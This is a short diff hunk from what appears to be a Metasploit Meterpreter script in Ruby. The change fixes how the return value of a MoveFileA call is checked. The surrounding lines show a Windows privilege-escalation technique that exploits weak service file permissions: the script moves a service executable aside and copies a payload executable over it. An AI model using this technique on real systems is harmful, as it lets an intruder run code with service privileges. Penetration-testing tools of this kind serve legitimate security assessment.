@@ -146,7 +146,7 @@ service_list.each do |serv|
 			print_status("Cannot reliably determine path for #{serv} executable. Trying #{source}")
 		end
 		#try to exploit weak file permissions
-		if(source != tempexe && client.railgun.kernel32.MoveFileA(source, source+'.bak'))
+		if(source != tempexe && client.railgun.kernel32.MoveFileA(source, source+'.bak')["return"])
 			client.railgun.kernel32.CopyFileA(tempexe, source, false)
 			print_status("#{serv} has weak file permissions - #{source} moved to #{source + '.bak'} and replaced.")
 			moved = true
